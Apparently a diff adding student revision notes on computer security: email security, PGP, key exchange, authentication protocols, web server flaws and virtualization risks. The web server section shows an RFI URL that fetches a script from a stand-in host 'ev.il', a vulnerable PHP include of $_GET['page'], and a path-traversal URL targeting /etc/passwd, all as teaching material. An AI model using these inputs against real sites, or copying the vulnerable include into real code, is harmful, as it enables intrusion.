+      <li>queries the PoP3 server to send a copy of their text file and tells the server to erase and reset the text file.</li>
+      <li>This copy is saved on their local message and the text file is parsed into the separate messages.</li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="general-security-issues-in-emails">General Security Issues in Emails</h2>
+
+<ol>
+  <li>Email is free (encourages spam, DoS attacks)</li>
+  <li>Email can carry payloads (viruses)</li>
+  <li>Email is easy to spoof (if there is no authentication)</li>
+</ol>
+
+<h3 id="email-servers">Email servers</h3>
+
+<p>Email servers contain email information of <strong>all</strong> email accounts – these will be known to the attacker if the server is compromised.</p>
+
+<p>Additionally, there is no <strong>guarantee for delivery</strong> if SMTP cannot connect to SMTP at receiver’s end. (Access in CIA)</p>
+
+<p>People have <strong>poor passwords</strong>.</p>
+
+<p>Emails can also be <strong>intercepted</strong> on insecure networks (packet sniffers)</p>
+
+<ul>
+  <li>Poor key-generation (if email is not correctly encrypted) – this compromises email confidentiality.</li>
+</ul>
+
+<p><img src=".\secure-email.assets\emailServers.png" alt="emailServers" style="zoom:67%;" /></p>
+
+<h2 id="solutions-to-problems">Solutions to problems</h2>
+
+<h3 id="spam">Spam</h3>
+
+<p>Spams can be handled with a spam filter (SpamAssassin). Spam filters can define a large set of rules</p>
+
+<ul>
+  <li>The format of sender’s email account</li>
+  <li>Whether the body of the email contains a certain pattern of words.</li>
+</ul>
+
+<p>These rules are matched against the email and the email is tested for each rule – giving a score. If this score <strong>exceeds a threshold</strong>, the email will be classified as a spam.</p>
+
+<h3 id="payloads">Payloads</h3>
+
+<p>Can be tackled with anti-virus software.</p>
+
+<p>Spam filters can also help with this, e.g. if the email has suspicious attachments it can be classified as spam.</p>
+
+<p>Be careful when opening emails is the best way to prevent this.</p>
+
+<h3 id="spoofing">Spoofing</h3>
+
+<p>Originator and apparent originators of an email are different.</p>
+
+<ul>
+  <li>An originator, e.g. some student can pose as a module organiser (apparent originator).</li>
+</ul>
+
+<p>Spam filters may help with spoofing , as this will examine the header of mails to check if the originator and apparent originator matches.</p>
+
+<p>Otherwise, we mainly use Digital Signatures to tackle spoofing.</p>
+
+<h3 id="interception">Interception</h3>
+
+<p>A straightforward solution</p>
+
+<ul>
+  <li>To send email, encrypt with the recipient’s public key</li>
+  <li>Recipient can then decrypt using their private key.</li>
+</ul>
+
+<p>However we do not use this method because it is slow to encrypt the whole email using public key encryption.</p>
+
+<blockquote>
+  <p>A <strong>faster solution</strong> is to use a shared secret key to encrypt the message. This is done with a session key.</p>
+
+  <ul>
+    <li>Session key is used to encrypt the email message.</li>
+    <li>Public key (RSA) is used to encrypt only the session key – hence faster.</li>
+    <li>The encrypted key and the email message is sent to the recipient as an encrypted message.</li>
+    <li>Recipient’s private key is used to decrypt the secret key which is then used to decrypt the message.</li>
+  </ul>
+</blockquote>
+
+<p><strong>Products that provide this solution.</strong></p>
+
+<ul>
+  <li>PGP (Pretty Good Privacy) – paid</li>
+  <li>GnuPG (Gnu Privacy Guard) – open source implementation of OpenPGP</li>
+  <li>Windows version Gpg4Win</li>
+</ul>
+
+<h4 id="pgp-encryption">PGP Encryption</h4>
+
+<p>Below is a diagram depicting how PGP Encryption works.</p>
+
+<figure>
+  <figcaption>PGP Encryption Diagram, <a href="https://en.wikipedia.org/wiki/File:PGP_diagram.svg">Wikimedia Commons</a></figcaption>
+  <img src="./secure-email.assets/PGP_diagram.svg" />
+</figure>
+
+            <br/>
+            <hr style="
+                padding: 5px;
+                border-radius: 1em;
+                background-color: whitesmoke;
+            ">
+            <br/><h1 id="security--authentication-protocols">Security &amp; Authentication Protocols</h1>
+       
+            <p align="center">A <b>security protocol</b> is a fixed pattern of exchanges (steps) between 2 or more communication parties to achieve a security related task.</p>
+
+<h2 id="diffie-hellman-merkel-key-exchange-protocol">Diffie-Hellman-Merkel Key Exchange Protocol</h2>
+
+<p><em>For brevity sake, I will refer to it as DHM</em></p>
+
+<blockquote>
+  <p>We use the DHM protocol when two parties wish to <strong>communicate privately</strong>, but the <strong>communication channel is not secure</strong> (everything can be read by outsiders), and they want to use <strong>secret key encryption</strong>.</p>
+</blockquote>
+
+<p>To do so, A and B have to first publicly agree on values for y and p in a modular exponentiation one way function: \(y^x \!\!\mod p\)</p>
+
+<ul>
+  <li>\(y\) needs to be the primitive root of \(p\)</li>
+  <li>\(p\) is an enormously large prime number</li>
+  <li>The two numbers can be publicly known</li>
+</ul>
+
+<p>A and B choose secret numbers, \(a\) and \(b\) respectively, then:</p>
+
+<ul>
+  <li>Put \(a\) into the one-way function and computes the result \(y^a \!\!\mod p = v_A\)</li>
+  <li>A sends \(v_A\) to B and receives \(v_B\) from B</li>
+  <li>A applies their function to \(v_B\): \((v_B)^a \!\!\mod p\)</li>
+  <li>B does the same with \((v_A)^b \!\!\mod p\), where \(b\) is B’s secret number.</li>
+</ul>
+
+<p>A and B will <strong>arrive at the same value</strong> which they use as their secret key \(s\).
+\((v_A)^b \!\!\mod p = (v_B)^a \!\!\mod p = s\)</p>
+
+<h2 id="authentication-protocol">Authentication Protocol</h2>
+
+<p>Normally when working in a local environment (<strong>secure channel</strong>) with a fixed link to the host, we use passwords to authenticate a user. However, more must be done over <strong>insecure channels</strong>.</p>
+
+<blockquote>
+  <p>Either use <strong>encrypted passwords</strong>, <strong>digital signature</strong>, or <strong>public key encryption</strong> for authentication.</p>
+</blockquote>
+
+<p>Recall how public keys can be used to ensure integrity and non-repudiation, provided that the public key is trusted. Why can’t it provide authentication as well?</p>
+
+<h3 id="replay-attack">Replay Attack</h3>
+
+<blockquote>
+  <p>Let’s say A sends B a message encrypted by KU<sub>A</sub>, B acknowledges that A is in fact A. However E also stores this message but does not touch it. After the communication with A and B is over, E can <strong>replay</strong> the message to B and B would accept E as A.</p>
+</blockquote>
+
+<p><strong>Solution 1.</strong> B generates a token R, which is a <strong>random number</strong> (also called a <em>nonce</em> :eyes: ), that A needs to <strong>sign for authentication</strong>. The final authenticated token, if it contains a digital signature that is encrypted with A’s private key can only mean it was authenticated by A and B can verify this by decrypting it with A’s public key.</p>
+
+<p>The interaction can be formalised with the notation below.</p>
+
+<ol>
+  <li>A → B : A</li>
+  <li>B → A : R</li>
+  <li>A → B : [R]<sub>A</sub></li>
+</ol>
+
+<p><strong>Solution 2.</strong> Timestamping. When A sends message to B, they include a timestamp in the encrypted message. If the message is replayed by E, B will know that it is an old message.</p>
+
+<h3 id="mutual-authentication">Mutual Authentication</h3>
+
+<p>Our above examples are a <strong>unilateral authentication</strong>: A authenticates B but not the other way around.</p>
+
+<p><strong>Mutual authentication.</strong> Two-way authentication</p>
+
+<ol>
+  <li>A → B : A, R<sub>A</sub></li>
+  <li>B → A : R<sub>B</sub>, [R<sub>A</sub>]<sub>B</sub> (In this step, A will know that B is truly B – as long as public key verified)</li>
+  <li>A → B : [R<sub>B</sub>]<sub>A</sub> (Here B, will know A is A)</li>
+</ol>
+
+<h3 id="authentication-with-ds-vs-encryption">Authentication with DS vs Encryption</h3>
+
+<p>Using <strong>digital signature</strong>:</p>
+
+<ol>
+  <li>A → B: “I’m Alice”</li>
+  <li>B → A: R (Bob’s token)</li>
+  <li>A → B : [R]<sub>Alice</sub> (Bob’s token signed by A)</li>
+</ol>
+
+<p>Using <strong>public key encryption</strong>:</p>
+
+<ol>
+  <li>A → B: “I’m Alice”</li>
+  <li>B → A: {R}<sub>KP<sub>Alice</sub></sub></li>
+  <li>A → B: R</li>
+</ol>
+
+<p>This achieves a similar effect to DS.</p>
+
+<h2 id="authentication-spoofing">Authentication Spoofing</h2>
+
+<blockquote>
+  <p>There’s still a problem with our protocol. A could communicate with E, but E could be <strong>malicious</strong> and decide to <strong>pass on the message</strong> to B. Now B will pass the token to E and E passes it to A and then passes the encrypted token back to B from A.</p>
+
+  <p>As a result, <strong>B thinks that they are communicating with A.</strong></p>
+
+  <p>This is often referred to as a “<strong>man-in-the-middle</strong>” (MITM) attack</p>
+</blockquote>
+
+<p>The main idea behind the two solutions are to include information about both the <strong>sender</strong> and the <strong>receiver</strong> during communication. Depending on which method we are using to authenticate (DS or Public key Encryption), we include the missing information.</p>
+
+<blockquote>
+  <p>TLDR.</p>
+
+  <ul>
+    <li>When using encryption, sender’s id is included.</li>
+    <li>When using digital signature, receiver’s id is included</li>
+  </ul>
+</blockquote>
+
+<p><strong>Solution 1.</strong> Include the identity of the <strong>intended recipient</strong> encrypted along with the hash of the token from the recipient because information of the sender is the digital signature.</p>
+
+<ol>
+  <li>A → B: A</li>
+  <li>B → A: R</li>
+  <li>A → B: [R, E]<sub>A</sub> 🔔❕❗</li>
+</ol>
+
+<p><strong>Solution 2.</strong> If we’re using encryption for authentication (Needham-Schroeder Authentication protocol), enclose the sender’s ID (B below) because receiver’s info is that the message was encrypted with their public key.</p>
+
+<ol>
+  <li>A → B: A</li>
+  <li>B → A: {B, R}<sub>KP<sub>A</sub></sub></li>
+  <li>A → B: R</li>
+</ol>
+
+<h2 id="needham-schroeder-secret-key-based-protocol">Needham-Schroeder Secret key-based protocol</h2>
+
+<p>We saw the public key encryption protocol by NS, they also proposed a secret key <strong>authentication</strong> protocol. In this protocol, there are 3 parties: A (K<sub>SA</sub> – key given to A by server), B (K<sub>SB</sub> – key given to B by server), Server (K<sub>AB</sub> – session key that server provides to both A and B)</p>
+
+<ol>
+  <li>A → S: A, B, R<sub>A1</sub></li>
+  <li>S → A: { R<sub>A1</sub>, B, { K<sub>AB</sub>, A }<sub>K<sub>SB </sub></sub>}<sub>K<sub>SA</sub></sub></li>
+  <li>A → B: { K<sub>AB</sub>, A }<sub>K<sub>SB</sub></sub>, { R<sub>A2</sub> }<sub>K<sub>AB</sub></sub></li>
+  <li>B → A: { R<sub>A2</sub> – 1, R<sub>B</sub>}<sub>K<sub>AB</sub></sub></li>
+  <li>A → B: { R<sub>B</sub> – 1 }<sub>K<sub>AB</sub></sub></li>
+</ol>
+
+<p><img src=".\part7.assets\needhamSchroeder.png" alt="needhamSchroeder" /></p>
+
+<blockquote>
+  <p><strong>Disadvantages.</strong> Server needs to distribute secret key directly to B, and since B does not ask for a key, but receives one, if B is not responsive (AFK) or the server somehow can’t reach B then there will be no communication.</p>
+</blockquote>
+
+<h3 id="possible-attack">Possible Attack</h3>
+
+<p>If E manages to obtain an old session key, K<sub>AB</sub>, E can replay the old message (step 3) relating to that session key.</p>
+
+<ul>
+  <li>If B completes the protocol and assumes that they shared a key with A, E would have tricked B.</li>
+  <li>Can prevent this easily with timestamps.</li>
+</ul>
+
+            <br/>
+            <hr style="
+                padding: 5px;
+                border-radius: 1em;
+                background-color: whitesmoke;
+            ">
+            <br/><h1 id="web-server-security-issues">Web Server Security Issues</h1>
+       
+            <blockquote>
+  <p><strong>Note.</strong> In the revision lecture, Ligang mentioned that web server will not be tested during the exam 🥳</p>
+</blockquote>
+
+<p>A large part of this topic was meant for us to understand more about the interactions between a client and the web server – which was relevant for our coursework at the time.</p>
+
+<p>What I have done is included the main security issues at the top of this page, however if there is trouble understanding somethings then you might need to read the sections to understand more about PHP, HTTP requests, Client and Web Server interaction etc.</p>
+
+<h2 id="remote-file-inclusion-rfi-vulnerability">Remote File Inclusion (RFI) Vulnerability</h2>
+
+<p>If the URL sent by the user is:</p>
+
+<p>http://yoursite.com/index.php?page=http://ev.il/badscript.php?</p>
+
+<p>include <code class="language-plaintext highlighter-rouge">$_GET[‘page’]”.html”</code> becomes:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>include http://ev.il/badscript.php?.html
+</code></pre></div></div>
+
+<p>What happens is that <code class="language-plaintext highlighter-rouge">badscript.php</code> will be run, because the content after “?” will be interpreted as input parameter of the php script.</p>
+
+<h2 id="forms">Forms</h2>
+
+<blockquote>
+  <p>A <strong>form</strong> is used to pass information from a web browser to a web server.</p>
+</blockquote>
+
+<p>There are 2 different ways to submit a form, GET or POST. Especially when forms contain sensitive information, POST is <strong>always safer</strong> than GET. When a form is sent:</p>
+
+<ul>
+  <li>GET request will have form parameters encoded in the head of the HTTP request as the address of the resource that we want to access.</li>
+  <li>POST requests will have the form parameters placed in the body of the HTTP requests. More <strong>secure</strong> because we can encrypt the HTTP request.</li>
+</ul>
+
+<h3 id="call-os-commands-in-php">Call OS commands in PHP</h3>
+
+<p>When using PHP, sometimes developers make the mistake of running shell commands through the PHP file that has a parameter/variable that depends on <strong>form inputs</strong>.</p>
+
+<blockquote>
+  <p>This is a potential vulnerability as an attacker can send code through these inputs and can make the web server OS perform commands that could compromise security.</p>
+</blockquote>
+
+<h2 id="path-exploits">Path Exploits</h2>
+
+<p>Path exploits try to enter the directory or access files that are not intended to be accessible.</p>
+
+<p>For example, if the user in put the web address:</p>
+
+<p>http://www.example.com/home/users/…/etc/passwd</p>
+
+<p>Without proper configuration, the passwd file will be displayed. When allow <code class="language-plaintext highlighter-rouge">_url_fopen</code> (a directive in the php configuration file - php.ini) is set to “on” – User’s will be allowed to retrieve and display the file in server, even if the file is not a typical web page (e.g. html or php).</p>
+
+<h2 id="robot-exclusion-protocol">Robot Exclusion Protocol</h2>
+
+<blockquote>
+  <p>Web crawlers or Web robots systematically scan the World Wide Web to mine data.</p>
+
+  <p>Robot Exclusion Protocol (REP) specifies which directories of the website that the robot should not scan.</p>
+</blockquote>
+
+<p>Instructions are written in the robots.txt file, which is in the root directory of the web server. Example:</p>
+
+<pre><code class="language-txt">User-agent:* # apply to all robots
+Disallow:/local/secure.html
+
+User-agents:Googlebot # apply only to Googlebot
+Disallow:/private/
+</code></pre>
+
+<p>When there is sensitive data, we should exclude robots from crawling those files.</p>
+
+<h2 id="accompanying-resources">Accompanying resources</h2>
+
+<p>That concludes the content covering potential security issues related to web servers. The content below is an additional resource to give background information about the Web Servers, PHP and HTTP requests. I recommend that you give it a read if you’re not confident in your knowledge of this topic.</p>
+
+<h3 id="interaction-between-client-and-web-server">Interaction between Client and Web Server</h3>
+
+<p>In general there are 5 main steps between client and server</p>
+
+<ol>
+  <li>User issues URL from a browser</li>
+  <li>Browser sends a request message</li>
+  <li>Server maps the URL to a file or program under the document directory</li>
+  <li>Server returns a response message</li>
+  <li>Browser formats the response and displays</li>
+</ol>
+
+<h3 id="http-request">HTTP Request</h3>
+
+<p>When a client types a URL address into the browser, our browser composes a message such as</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/docs/index/.html</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">www.nowhere123.com</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">image/gif, image/jpeg, */*</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-us</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozzila/4.0 (compatible; MSIE 6.0; Windows NT 5.1)</span>
+<span class="s">{blank line}</span>
+</code></pre></div></div>
+
+<p>The message consists of a number of lines. The first line is the request line.</p>
+
+<ul>
+  <li><strong>Format</strong>: <u>message_name</u>  <u>request-uri</u> (address of the resource we want to access)  <u>HTTP-version</u>.</li>
+  <li>In the example this is the first line.</li>
+</ul>
+
+<p>Request line is followed by request headers</p>
+
+<ul>
+  <li><strong>Format</strong>: <u>name</u> : <u>value</u> pairs</li>
+  <li>In the example this is the 2nd line. Name is “Host”. Value is “www.nowhere123.com”</li>
+</ul>
+
+<p>Request line and request headers are together called request message header, followed by request message body. In the example above, the request message body is blank.</p>
+
+<h4 id="http-request-methods">HTTP Request Methods</h4>
+
+<ul>
+  <li>HTTP protocol defines a set of request methods.
+    <ul>
+      <li>in the example above, the message is <strong>GET</strong> - when we type an address in the browser search bar, we always trigger a GET request.</li>
+    </ul>
+  </li>
+</ul>
+
+<p><strong>Methods supported by web server</strong></p>
+
+<ul>
+  <li><strong>GET</strong> : get a web resource from the server</li>
+  <li><strong>HEAD</strong>: get the header that a GET request would have obtained</li>
+  <li><strong>POST</strong>: Used to post the data up to the web server</li>
+  <li><strong>PUT</strong>: Ask the server to store the data</li>
+  <li><strong>DELETE</strong>: Ask the server to delete the data</li>
+  <li><strong>OPTIONS</strong>: Ask the server to request the list of request methods it supports</li>
+</ul>
+
+<h4 id="how-http-server-process-requests">How HTTP server process requests</h4>
+
+<h5 id="listening">Listening</h5>
+
+<p>HTTP server listens to the port(s) specified in the configuration file of the server</p>
+
+<ul>
+  <li>Port is the endpoint communication destination and is associated to a process/service
+    <ul>
+      <li>the request arriving at a certain port will be processed by the associated service</li>
+    </ul>
+  </li>
+  <li>port is a 16 bit number- there are 66536 ports in a computer</li>
+  <li>http: 80, ssh: 22, ftp: 21, smtp: 25, etc.</li>
+</ul>
+
+<h5 id="processing">Processing</h5>
+
+<p>After the server receives the request there are three general ways to process to request</p>
+
+<ol>
+  <li>map the request to a <strong>file</strong> in the directory in the server, and returns the file to the client</li>
+  <li>map the request to a <strong>program</strong> in the server, executes the program, and returns the output of the program to the client. (e.g. post request, CGI)</li>
+  <li>the request cannot be satisfied, the server returns an <strong>error</strong> message.</li>
+</ol>
+
+<p>If the webpage is HTML file, CGI is one way to invoke a program in the server. If we use PHP to write a webpage we can embed functions in the web page. PHP is a tool for making dynamic web pages.</p>
+
+<h3 id="php">PHP</h3>
+
+<p>A section in HTML file. Here is an example:</p>
+
+<pre><code class="language-php+HTML">&lt;?php
+echo My first PHP 
+?&gt;
+</code></pre>
+
+<p><strong>Dynamic file loading in PHP</strong></p>
+
+<p>Suppose the link of your website is: http://yoursite.com/index.php</p>
+
+<p>In the webpage, there is the following php code:</p>
+
+<pre><code class="language-php+HTML">&lt;?php include $_GET['page']".html"; ?&gt;
+</code></pre>
+
+<p>PHP supports loading a file based on data passed via the URL parameter.</p>
+
+<p>When the user types the following web address:</p>
+
+<p>http://yoursite/com/index.php?page=photos</p>
+
+<ul>
+  <li>The content after “?” is interpreted as the parameter of the request</li>
+  <li>i.e. index.php is run with “page=photos” as input parameter.</li>
+</ul>
+
+<p>Lets look more at <code class="language-plaintext highlighter-rouge">include $_GET['page']".html</code>:</p>
+
+<p>In PHP there are internal arrays which are used to hold information that are passed from the client. The <code class="language-plaintext highlighter-rouge">$_</code> tells PHP that we are trying to access an array and <code class="language-plaintext highlighter-rouge">GET['page']</code> tells PHP we are trying to access the <code class="language-plaintext highlighter-rouge">page</code> variable in the <code class="language-plaintext highlighter-rouge">GET</code> array. The <code class="language-plaintext highlighter-rouge">include</code> statement loads “photos.html” because we pass page=photos.</p>
+
+<p>It is a dynamic web page, because the same source of the web page displays different content depending on the user’s input</p>
+
+<p>For example, if the user types <code class="language-plaintext highlighter-rouge">page=contact</code>, then contact.html page will be loaded instead.</p>
+
+
+            <br/>
+            <hr style="
+                padding: 5px;
+                border-radius: 1em;
+                background-color: whitesmoke;
+            ">
+            <br/><h1 id="virtualization">Virtualization</h1>
+       
+            <p align="center">Virtualization technology allows multiple operating systems to share a computer – a running instance of an operating system is called a <b>Virtual Machine</b></p>
+
+<h2 id="introduction-to-virtualization">Introduction to Virtualization</h2>
+
+<p><strong>Terminologies.</strong></p>
+
+<ul>
+  <li>Host Machine – physical machine VM is running on</li>
+  <li>Host OS – OS in the host machine</li>
+  <li>Guest OS – OS in the VM</li>
+</ul>
+
+<h3 id="architecture-of-a-physical-machine">Architecture of a Physical Machine</h3>
+
+<blockquote>
+  <p>The OS sits between the hardware and its applications and manages the interaction between application and hardware resources. It is the <strong>lowest level software</strong> in a machine.</p>
+</blockquote>
+
+<p><img src="part9.assets/image-20210513154828402.png" alt="image-20210513154828402" style="zoom:67%;" class="center" /></p>
+
+<h3 id="virtualization-architecture">Virtualization Architecture</h3>
+
+<h4 id="embedded">Embedded</h4>
+
+<p>In an embedded architecture, the hypervisor sits in between guest OSes and hardware. Each grey box is called a domain and is a VM – they are managed by the hypervisor.</p>
+
+<p><strong>Properties of Domain0</strong> in Xen</p>
+
+<ul>
+  <li>Domain0 is able to manage and control other guest domains</li>
+  <li>Domain0 contain device drivers to access hardware, guest domains cannot access hardware
+    <ul>
+      <li>When guest domains want to request access to hardware, they are routed to Domain0.</li>
+      <li>Multiple guest domains share resources with other guest domains (resources are virtualized).</li>
+    </ul>
+  </li>
+  <li>Can interact with other VMs</li>
+</ul>
+
+<p><img src="part9.assets/image-20210513155405572.png" alt="image-20210513155405572" style="zoom:67%;" class="center" /></p>
+
+<h4 id="non-embedded">Non-embedded</h4>
+
+<p>Hypervisor runs as an application to host OS e.g. QEMU.</p>
+
+<blockquote>
+  <p>These type of systems use a technique called <strong>dynamic binary translation</strong> technique. This translates an instruction issued in Guest OS to an instruction that can run in the host OS.</p>
+
+  <p>This is also why non-embedded architectures are slower than embedded, because every instruction has to be <strong>translated</strong>.</p>
+</blockquote>
+
+<p><img src="part9.assets/image-20210513160511698.png" alt="image-20210513160511698" style="zoom:67%;" class="center" /></p>
+
+<h3 id="abstract-of-physical-resources">Abstract of Physical Resources</h3>
+
+<p>Inside the <strong>hypervisor</strong>, hardware is simulated as files – virtual disk (vDisk), virtual CPU (vCPU), virtual memory (vRAM).</p>
+
+<ul>
+  <li>These files are transferred to real hardware when necessary</li>
+  <li>This is why in the coursework we create a <code class="language-plaintext highlighter-rouge">.cow</code> file for <strong>QEMU</strong></li>
+</ul>
+
+<h3 id="life-cycles-of-vms">Life cycles of VMs</h3>
+
+<p>In a normal physical machine, you can be in 3 states: <strong>Off</strong>, <strong>Running</strong>, or <strong>Suspended</strong> (Sleep).</p>
+
+<p>In VMs, you have an additional state: <strong>Paused</strong></p>
+
+<ul>
+  <li>VM is still resident in the host machine but not allocated CPU.</li>
+  <li>When multiple VMs are resident, only 1 VM is allocated CPU at a time (running on the physical machine), other VMs will be paused.</li>
+</ul>
+
+<h2 id="impact-of-virtualization-on-security">Impact of Virtualization on Security</h2>
+
+<p>Below are a list of properties of VMs, and their impact on security.</p>
+
+<h3 id="isolated">Isolated</h3>
+
+<p><em>Isolation</em></p>
+
+<p>In a traditional multi-user OS, all user in the computer can be affected by an attack</p>
+
+<blockquote>
+  <p>In virtualisation, each guest OS is encapsulated and hardware is abstracted</p>
+
+  <ul>
+    <li>Each VM accesses separate file systems and memory blocks</li>
+    <li>VM technology provides an extra layer of isolation.</li>
+  </ul>
+</blockquote>
+
+<p>Ideally a VM compromised by attackers will not affect the host or other VMs on the host</p>
+
+<p>Isolation and abstraction of VMs provides an <strong>additional security</strong> over traditional multi-user computers</p>
+
+<h3 id="transient">Transient</h3>
+
+<p><em>Transience</em></p>
+
+<p>Physical servers are often always on while VMs can be started very quickly and remotely</p>
+
+<blockquote>
+  <p>Typically VMs are <strong>turned on only when they are needed</strong>, and turned off when they are not used anymore</p>
+
+  <p><strong>Limiting operating time</strong> of VMs <strong>mitigates security risks</strong> because we can only infect a machine (physical or virtual) that is on.</p>
+</blockquote>
+
+<p><strong>However. It is a double edged sword.</strong></p>
+
+<p>When virus hits <strong>conventional</strong> networks of physical machines, administrators often do the following</p>
+
+<ul>
+  <li>Identify which machines are infected</li>
+  <li>Clean up infected machines</li>
+  <li>Apply security patches to prevent re-infection</li>
+</ul>
+
+<blockquote>
+  <p>In virtualised environments, infected VMs may appear briefly and disappear before they can be detected making it <strong>difficult to identify which VMs are infected</strong>.</p>
+
+  <p>When performing patch management, virus and vulnerability scanning, the <strong>machines must be on</strong>. Because VMs are transient and not always on – <strong>difficult to fix the vulnerability of infected VMs</strong>.</p>
+
+  <p>The infected VMs may appear online briefly, infect other VMs and disappear offline before they are noticed making it <strong>difficult to <u>eradicate</u> the infection in the system.</strong></p>
+</blockquote>
+
+<p>As a result, in virtualisation environment worm/virus infections tend to persist at a low level and flare up again at another time.</p>
+
+<h3 id="state-restoring">State Restoring</h3>
+
+<blockquote>
+  <p>The virtual disk for a VM is stored as a file on the hypervisor. This allows the hypervisor to record changes to the contents of the virtual disk.</p>
+
+  <ul>
+    <li>
+      <p>It is <strong>easy</strong> for VMs to <strong>restore</strong> to <strong>previous states</strong>.</p>
+    </li>
+    <li>
+      <p>State restore <strong>provides a virus removal mechanism</strong> for infected VMs and helps <strong>ensure data integrity</strong>.</p>
+    </li>
+  </ul>
+</blockquote>
+
+<p><strong>However,</strong> if the hypervisor is compromised then we can’t restore state, and attackers have unlimited freedom and access to the hardware. (Limitation)</p>
+
+<p><strong>Additionally,</strong> since it is easy to restore infected VMs many users <strong>are not motivated</strong> to secure their VMs with virus protection</p>
+
+<ul>
+  <li>60% of VMs in production are less secure than their physical counterparts, due to this factor</li>
+</ul>
+
+<h4 id="security-patches">Security Patches</h4>
+
+<p>In physical machines, when a new <strong>security patch</strong> is applied, the machines remain patched. A VM may also get the security patch, but if the user rolls back to a previous state, then the guest OS is no longer patched. It is <strong>challenging</strong> for system administrators <strong>to apply security patch</strong> in VMs because they have to</p>
+
+<ul>
+  <li>record when patches have been applied</li>
+  <li>evaluate which patches need to be applied again when a VM is restored to a previous state</li>
+</ul>
+
+<blockquote>
+  <p><strong>Furthermore</strong>, rolling back a VM may <strong>expose vulnerabilities</strong></p>
+
+  <ul>
+    <li>re-expose patched vulnerabilities or virus</li>
+    <li>re-enable accounts or passwords that have been disabled</li>
+    <li>reuse encryption keys/tokens that have been deleted.</li>
+  </ul>
+</blockquote>
+
+<h4 id="data-lifetime">Data Lifetime</h4>
+
+<blockquote>
+  <p>A fundamental principle for building secure systems is <strong>minimising the amount of time</strong> that sensitive data remains in a system</p>
+</blockquote>
+
+<p>In virtualised system, all changes are <strong>recorded</strong>, which <strong>undermines</strong> the principle. Moreover, the state changes will be transferred to persistent storage, which again break the security principle.</p>
+
+<h3 id="low-privilege">Low Privilege</h3>
+
+<p>In a physical computer, OS is the software that has the highest privilege in the computer</p>
+
+<ul>
+  <li>OS can only be monitored by itself in a physical machine</li>
+  <li>If the OS is infected with virus, it cannot be trusted. (Not reliable)</li>
+</ul>
+
+<blockquote>
+  <p>A VM has <strong>lower privilege</strong> than the hypervisor.</p>
+
+  <ul>
+    <li>VMS can be <strong>monitored by either the hypervisor</strong>, or by an <strong>authorised dedicated VM</strong> (Domain0)
+      <ul>
+        <li>The <strong>latter is preferred</strong> method since it helps <strong>keep the hypervisor simple</strong></li>
+        <li>The hypervisor gives the dedicated VM the permission to view resources allocated to the monitored VM.</li>
+      </ul>
+    </li>
+  </ul>
+</blockquote>
+
+<h4 id="security-patch">Security Patch</h4>
+
+<p>In physical machines, when a new security patch is applied, the machines remain patched ,</p>
+
+<p>A VM may also get the security patch, but if the user rolls back to a previous state, then the guest OS is no longer patched</p>
+
+<p>Therefore, it is very challenging for system administrators to apply security patch in VMs because they have to</p>
+
+<ul>
+  <li>record when patches have been applied</li>
+  <li>evaluate which patches need to be applied again when a VM is restored to a previous state</li>
+</ul>
+
+<h3 id="mobile">Mobile</h3>
+
+<p><em>Mobility</em></p>
+
+<p>VMS are not physical, everything about a VM is virtualised as files – makes <strong>theft</strong> of data easier.</p>
+
+<p>In fact, attackers <strong>can access copies</strong> of VM that are located on the <strong>physical disk</strong> of the host machine. Because the Guest OS has no access to that disk, the VM will <strong>not show any records</strong> of intrusion.</p>
+
+<blockquote>
+  <p>Being <strong>offline</strong> does not guarantee safety. An attacker can access and modify VM files while the VM is offline. A physical machine must be running to be susceptible.</p>
+</blockquote>
+
+<h3 id="easy-to-create">Easy to Create</h3>
+
+<p>In a traditional network of physical machines, all machines have same configurations.</p>
+
+<ul>
+  <li>When there are security vulnerabilities, the same security measure can be applied to all machines</li>
+</ul>
+
+<blockquote>
+  <p>VMs can be created rapidly, each with a unique configuration (<strong>VM Sprawl</strong>)</p>
+
+  <ul>
+    <li><strong>Cannot apply</strong> a uniform security measure to all VMs</li>
+    <li>The rapid growth of VMs exceeds the administrators’ ability to secure each unique VM</li>
+  </ul>
+</blockquote>
+
+<h3 id="lack-of-identity">Lack of Identity</h3>
+
+<p>In a traditional environment, a machine can be identified by MAC address, Ethernet port number. It is used as a mechanism of non-repudiation – the system has the mechanism to check who did something.</p>
+
+<blockquote>
+  <p>In a virtualised system , there is <strong>only one</strong> physical MAC address and a Port number, <strong>but multiple</strong> VMs are running so we cannot use MAC or ethernet port number for <strong>non-repudiation</strong> anymore.</p>
+</blockquote>
+
+<h2 id="other-security-issues">Other Security Issues</h2>
+
+<h3 id="hypervisor-intrusion">Hypervisor Intrusion</h3>
+
+<blockquote>
+  <p>If the hypervisor is compromised, the attacker can access all the VMs.</p>
+</blockquote>
+
+<p>For non-embedded hypervisor, the hypervisor is a program, running on the host OS</p>
+
+<ul>
+  <li>If it is compromised, all VMs can be accessed</li>
+  <li>The host OS will be in danger as well, as the hypervisor converts instructions (dynamic binary translation) for the guest OS into instructions for the host OS
+    <ul>
+      <li>This means he instructions sent by hypervisor <strong>can no longer be trusted</strong> as it could be malicious.</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="security-due-to-inter-vm-communication">Security due to Inter-VM communication</h3>
+
+<blockquote>
+  <p>“VM-to-VM” attacks means that attackers user one VM to access or control other VMs on the same hypervisor.</p>
+</blockquote>
+
+<p>Attacks can be achieved by inter-VM communication. A malicious VM can potentially access other VMs because all VMs share resources (memory, network connections etc.) on the hypervisor.</p>
+
+<p><em>One example is with the embedded architecture of virtualization.</em></p>
+
+<p>Domain0 is connected to all guest domains and inter-VM communication happens through the hypervisor. An attack on the <strong>shared memory segment</strong> of the hypervisor can use 1 VM to attack another VM.</p>
+
+<h3 id="denial-of-service">Denial of Service</h3>
+
+<blockquote>
+  <p>An <strong>improperly configured</strong> hypervisor can allow a <strong>single VM</strong> to consume all resources, starving other running VMs.</p>
+</blockquote>
+
+<p>However, the solution to this is <strong>simple</strong>. Hypervisors should prevent any VM from gaining 100% usage of any resources.</p>
